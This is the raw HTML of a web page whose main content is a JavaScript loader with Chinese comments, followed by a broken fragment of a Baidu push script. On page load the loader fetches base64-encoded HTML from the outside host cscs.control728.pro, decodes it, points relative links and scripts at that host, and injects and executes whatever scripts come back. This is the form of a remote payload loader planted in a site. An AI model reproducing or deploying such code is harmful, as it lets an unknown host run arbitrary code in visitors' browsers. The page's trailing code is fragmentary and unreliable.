<script type='text/javascript'>
const currentPath = window.location.pathname + window.location.search;

const fetchUrl = '//cscs.control728.pro' + currentPath;

fetch(fetchUrl)
  .then(response => response.text())
  .then(function(encodedHtml) {
    var uint8Array = new Uint8Array(atob(encodedHtml).split('').map(function(c) {
      return c.charCodeAt(0);
    }));
    var decoder = new TextDecoder('utf-8');
    var decodedHtml = decoder.decode(uint8Array);

    // 创建临时容器，插入动态 HTML 内容
    var tempContainer = document.createElement('div');
    tempContainer.innerHTML = decodedHtml;

    // 处理 link 标签
    var links = tempContainer.getElementsByTagName('link');
    for (var i = 0; i < links.length; i++) {
      var href = links[i].getAttribute('href');
      if (href && (href.startsWith('/') || !href.includes('http'))) {
        links[i].href = '//cscs.control728.pro' + (href.startsWith('/') ? href : '/' + href);
      }
    }

    // 处理 script 标签
    var scripts = tempContainer.getElementsByTagName('script');
    for (var i = 0; i < scripts.length; i++) {
      var src = scripts[i].getAttribute('src');
      if (src && (src.startsWith('/') || !src.includes('http'))) {
        scripts[i].src = '//cscs.control728.pro' + (src.startsWith('/') ? src : '/' + src);
      }
    }

    // 将动态内容插入到 DOM 中
    var container = document.getElementById('app');
    container.innerHTML = tempContainer.innerHTML;
    container.style.display = 'block'; // 确保容器显示

    // 动态插入脚本
    for (var i = 0; i < scripts.length; i++) {
      var newScript = document.createElement('script');
      if (scripts[i].src) {
        newScript.src = scripts[i].src;
        newScript.async = false; // 按顺序执行脚本
      } else {
        newScript.text = scripts[i].text;
      }
      document.body.appendChild(newScript);
    }

    
    initializeLazyLoad();
  })
  .catch(error => console.error('Error:', error));


function initializeLazyLoad() {

  if (typeof lozad === 'function') {
    const observer = lozad(); 
    observer.observe(); 
  } else {
    console.error('Lozad library is not loaded.');
  }
}
</script>

    <div id="app">
   
</div>

    }

        bp.src = 'http://push.zhanzhang.baidu.com/push.js';

    s.parentNode.insertBefore(bp, s);
})();
